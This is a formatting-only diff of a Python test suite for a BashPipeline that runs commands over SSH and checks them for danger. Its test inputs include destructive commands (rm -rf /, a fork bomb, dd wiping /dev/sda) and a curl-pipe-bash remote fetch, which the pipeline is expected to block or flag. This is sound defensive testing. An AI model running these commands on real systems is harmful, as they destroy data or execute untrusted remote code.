@@ -21,9 +21,7 @@ def mock_ctx() -> MagicMock:
 def mock_ssh_pool() -> MagicMock:
     """Create mock SSH pool."""
     pool = MagicMock()
-    pool.execute = AsyncMock(
-        return_value=MagicMock(stdout="output", stderr="", exit_code=0)
-    )
+    pool.execute = AsyncMock(return_value=MagicMock(stdout="output", stderr="", exit_code=0))
     return pool
 
 
@@ -36,9 +34,7 @@ def mock_deps() -> PipelineDeps:
 class TestBashPipelineProperties:
     """Tests for BashPipeline properties."""
 
-    def test_name_is_bash(
-        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
-    ) -> None:
+    def test_name_is_bash(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
         """Test pipeline name is 'bash'."""
         pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])
         assert pipeline.name == "bash"
@@ -51,9 +47,7 @@ class TestBashPipelinePlan:
         self, mock_ctx: MagicMock, mock_deps: PipelineDeps
     ) -> None:
         """Test planning a simple safe command."""
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["systemctl status nginx"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["systemctl status nginx"])
 
         result = await pipeline.plan()
 
@@ -65,9 +59,7 @@ class TestBashPipelinePlan:
         self, mock_ctx: MagicMock, mock_deps: PipelineDeps
     ) -> None:
         """Test planning blocks dangerous commands."""
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["rm -rf /"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["rm -rf /"])
 
         result = await pipeline.plan()
 
@@ -79,9 +71,7 @@ class TestBashPipelinePlan:
         self, mock_ctx: MagicMock, mock_deps: PipelineDeps
     ) -> None:
         """Test planning warns on risky commands."""
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["systemctl restart nginx"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["systemctl restart nginx"])
 
         result = await pipeline.plan()
 
@@ -112,9 +102,7 @@ class TestBashPipelinePlan:
 class TestBashPipelineDiff:
     """Tests for diff stage."""
 
-    async def test_diff_shows_commands(
-        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
-    ) -> None:
+    async def test_diff_shows_commands(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
         """Test diff shows commands to be executed."""
         pipeline = BashPipeline(
             mock_ctx,
@@ -133,21 +121,15 @@ class TestBashPipelineDiff:
         assert "Rollback" in result.diff_output
         assert result.modifications == 2
 
-    async def test_diff_assesses_risk(
-        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
-    ) -> None:
+    async def test_diff_assesses_risk(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
         """Test diff assesses risk level."""
         # Low risk
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["echo test"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])
         result = await pipeline.diff()
         assert result.risk_assessment == "low"
 
         # High risk
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["rm -r /tmp/old", "kill -9 1234"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["rm -r /tmp/old", "kill -9 1234"])
         result = await pipeline.diff()
         assert result.risk_assessment == "high"
 
@@ -163,9 +145,7 @@ class TestBashPipelineApply:
     ) -> None:
         """Test apply executes all commands."""
         mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["echo hello", "echo world"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo hello", "echo world"])
 
         result = await pipeline.apply()
 
@@ -187,9 +167,7 @@ class TestBashPipelineApply:
             ]
         )
         mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["echo ok", "false", "echo never"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo ok", "false", "echo never"])
 
         result = await pipeline.apply()
 
@@ -205,9 +183,7 @@ class TestBashPipelineApply:
     ) -> None:
         """Test apply records executed commands for rollback."""
         mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["echo test"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])
 
         result = await pipeline.apply()
 
@@ -220,12 +196,8 @@ class TestBashPipelineApply:
         mock_deps: PipelineDeps,
     ) -> None:
         """Test apply handles exceptions gracefully."""
-        mock_ctx.get_ssh_pool = AsyncMock(
-            side_effect=RuntimeError("Connection failed")
-        )
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["echo test"]
-        )
+        mock_ctx.get_ssh_pool = AsyncMock(side_effect=RuntimeError("Connection failed"))
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])
 
         result = await pipeline.apply()
 
@@ -236,9 +208,7 @@ class TestBashPipelineApply:
 class TestBashPipelineRollback:
     """Tests for rollback stage."""
 
-    async def test_rollback_no_commands(
-        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
-    ) -> None:
+    async def test_rollback_no_commands(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
         """Test rollback fails when no commands defined."""
         pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])
 
@@ -364,46 +334,30 @@ class TestBashPipelinePostCheck:
 class TestDangerousPatterns:
     """Tests for dangerous pattern detection."""
 
-    def test_fork_bomb_blocked(
-        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
-    ) -> None:
+    def test_fork_bomb_blocked(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
         """Test fork bomb is blocked."""
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=[":(){:|:&};:"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=[":(){:|:&};:"])
         result = pipeline._check_dangerous_patterns(":(){:|:&};:")
         assert result["blocked"] is True
 
-    def test_dd_blocked(
-        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
-    ) -> None:
+    def test_dd_blocked(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
         """Test dd if= is blocked."""
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["dd if=/dev/zero of=/dev/sda"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["dd if=/dev/zero of=/dev/sda"])
         result = pipeline._check_dangerous_patterns("dd if=/dev/zero of=/dev/sda")
         assert result["blocked"] is True
 
-    def test_curl_pipe_bash_warned(
-        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
-    ) -> None:
+    def test_curl_pipe_bash_warned(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
         """Test curl pipe bash is warned."""
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["curl http://x.com | bash"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["curl http://x.com | bash"])
         # The pattern checks for "curl | bash" as substring
         result = pipeline._check_dangerous_patterns("curl | bash")
         assert result["blocked"] is False
         assert result["warning"] is not None
         assert "remote script" in result["warning"].lower()
 
-    def test_safe_command_allowed(
-        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
-    ) -> None:
+    def test_safe_command_allowed(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
         """Test safe commands are allowed."""
-        pipeline = BashPipeline(
-            mock_ctx, mock_deps, commands=["cat /etc/hosts"]
-        )
+        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["cat /etc/hosts"])
         result = pipeline._check_dangerous_patterns("cat /etc/hosts")
         assert result["blocked"] is False
         assert result["warning"] is None
